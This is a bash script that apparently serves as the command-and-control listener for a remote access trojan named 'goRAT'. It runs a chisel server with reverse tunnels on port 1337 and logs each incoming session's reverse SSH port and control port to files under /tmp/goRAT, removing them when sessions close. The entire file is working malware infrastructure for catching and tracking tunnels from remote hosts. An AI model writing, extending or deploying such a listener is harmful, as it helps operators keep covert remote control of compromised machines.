#!/bin/bash

base="/tmp/goRAT"
s_ports="/tmp/goRAT/SSH_Ports"
c_ports="/tmp/goRAT/Control_Ports"
last_port=0

rm -rf $base
mkdir -p $base
touch $s_ports
touch $c_ports

echo "Chisel Server Listening on 0.0.0.0:1337"
./chisel_1.7.6 server -p 1337 -v --reverse 2>&1 |

while read -r line
  do
    if echo "$line" | grep -q "Listening"; then
            if echo "$line" | grep -q "session"; then
                    port=$(echo "$line" | grep "Listening" | cut -d':' -f 7 | cut -d'=' -f 1)
                    session=$(echo "$line" | cut -d'#' -f2 | cut -d':' -f1)
                    val=$(echo "$last_port + 1" | bc)

                    if [ "$val" -eq "$port" ]; then
                      echo "Session #$session | Control Server Mounted On: $port"
                      echo "Session $session : $port" >> $c_ports
                    else
                      echo "Session #$session | SSH Server Mounted On: $port"
                      echo "Session $session : $port" >> $s_ports
                    fi
                    last_port="$port"
            fi
    fi

    if echo "$line" | grep -q "Closed connection"; then
            if echo "$line" | grep -q "session"; then
                    session=$(echo "$line" | cut -d'#' -f2 | cut -d':' -f1)
                    echo "Session #$session | Closed Connection on Two Ports"
                    grep -v "Session $session" $s_ports > $s_ports.tmp
                    mv $s_ports.tmp $s_ports
                    grep -v "Session $session" $c_ports > $c_ports.tmp
                    mv $c_ports.tmp $c_ports
            fi
    fi
done
